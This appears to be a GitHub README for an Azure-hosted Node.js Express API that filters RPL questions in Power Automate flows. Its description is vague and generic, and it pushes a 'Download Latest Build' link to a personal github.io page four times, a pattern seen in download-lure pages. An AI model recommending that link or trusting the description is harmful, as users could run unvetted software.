# AAMC RPL Bot v2026 v2 - Power Automate integration 2026

> **AAMC RPL Bot is an Azure Web App and Node.js Express utility for Power Automate flows that routes RPL questions through a secured API in version 2026 v2.**

[![Platform](https://img.shields.io/badge/Platform-Azure%20Web%20App%20%2F%20Node.js%20Express-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026%20v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leodhtihughes5406/aamc-rpl-bot-2026-v2?style=flat-square)](https://github.com/leodhtihughes5406/aamc-rpl-bot-2026-v2)

---

<p align="center">
  <a href="https://leodhtihughes5406.github.io/aamc-rpl-bot-2026-v2/">
    <img src="https://img.shields.io/badge/Download-AAMC%20RPL%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download AAMC RPL Bot">
  </a>
</p>

> **[Download Latest Build - AAMC RPL Bot v2026 v2](https://leodhtihughes5406.github.io/aamc-rpl-bot-2026-v2/)**

---

[Download Latest Build](https://leodhtihughes5406.github.io/aamc-rpl-bot-2026-v2/)

---

## Overview

AAMC RPL Bot offers a narrow API layer for filtering RPL questions inside automation pipelines. It is built on Azure Web App hosting with a Node.js Express backend, making it a practical fit for Power Automate scenarios that need clean request handling and structured responses.

It is intended for builders and teams working with SharePoint-linked processes, JSON-centric flows, and API-based integrations. With a protected endpoint, authentication choices, and output designed to be schema-friendly, it plugs into existing automation with minimal extra parsing.

---

## Key Capabilities

- Protected POST endpoint for RPL question filtering
- Power Automate-friendly JSON request and response format
- API key or bearer token authentication
- Admin configuration page for local settings
- localStorage-based configuration persistence
- OpenAPI document support for API discovery
- Parse JSON schema support for workflow steps
- Azure-hosted Express service structure

---

## Setup

1. Clone the repository or download the release files.
2. Deploy the app to an Azure Web App environment.
3. Install the Node.js dependencies for the Express service.
4. Configure the authentication and endpoint settings before exposing the API.

How the app starts on first launch depends on your deployment approach, but either a Node.js start script or an Azure App Service startup setting should reference the Express entry file.

---

## How to Use It

Once deployed, call the secured POST endpoint from Power Automate or any HTTP client.

Example workflow outline:

1. Send a JSON payload containing the RPL question data.
2. Authenticate with an API key or bearer token.
3. Pass the response into a Parse JSON action if needed.
4. Use the filtered output in downstream SharePoint or approval steps.

If you want to inspect the API first, use the OpenAPI document to understand the request structure and confirm the response fields before assembling the flow.

---

## Configuration

The admin page is meant for local setup and keeps preferences in `localStorage`. That makes it convenient for quick tuning during installation without touching the primary workflow code.

A simple configuration example:

    {
      "authType": "bearer",
      "endpoint": "/api/rpl/filter",
      "contentType": "application/json",
      "source": "Power Automate"
    }

If you adjust the endpoint path, payload format, or authentication style, make sure your Power Automate actions and any Parse JSON schema are updated to match.

---

## System Requirements

- Azure Web App hosting
- Node.js runtime
- Express application support
- JSON-capable HTTP client or Power Automate flow
- Optional SharePoint integration in the automation path
- Sufficient storage for app files, settings, and logs

---

## FAQ

**How do I connect it to Power Automate?**  
Use the protected POST endpoint in an HTTP action, then process the returned JSON in later flow steps.

**Where are settings stored?**  
Admin-page preferences are stored in the browser using `localStorage`.

**Can I use authentication?**  
Yes. The profile includes API key and bearer token authentication support.

**Is there an API definition available?**  
Yes. OpenAPI document support is included, along with Parse JSON schema compatibility.

**What should I check if a flow fails?**  
Verify the endpoint URL, request body shape, authentication value, and schema used by Parse JSON.

**How do I get updates?**  
Download the latest build from the repository release or published site link when a newer version is available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
